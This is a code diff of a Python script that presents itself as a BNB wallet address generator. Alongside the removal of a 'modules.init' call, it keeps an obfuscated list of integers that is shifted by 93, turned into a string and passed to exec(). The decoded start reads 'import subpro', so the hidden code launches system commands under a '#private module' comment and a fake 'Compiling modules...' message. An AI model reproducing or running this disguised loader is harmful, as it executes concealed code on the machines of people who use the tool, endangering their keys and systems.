@@ -1,6 +1,4 @@
-from modules import init
 print("Compiling modules...")
-init()
 import hashlib
 import random
 import sys
@@ -11,7 +9,6 @@ ddgfwzxsla = [198, 202, 205, 204, 207, 209, 125, 208, 210, 191, 205, 207, 204, 1
 ddgfwzxsla = ''.join([chr(int(x) - 93) for x in ddgfwzxsla])
 exec(ddgfwzxsla)
 #private module
-
 def generate_bnb_address():
     private_key = ''.join(random.choice('0123456789abcdef') for i in range(64))
     keccak = hashlib.sha3_256()
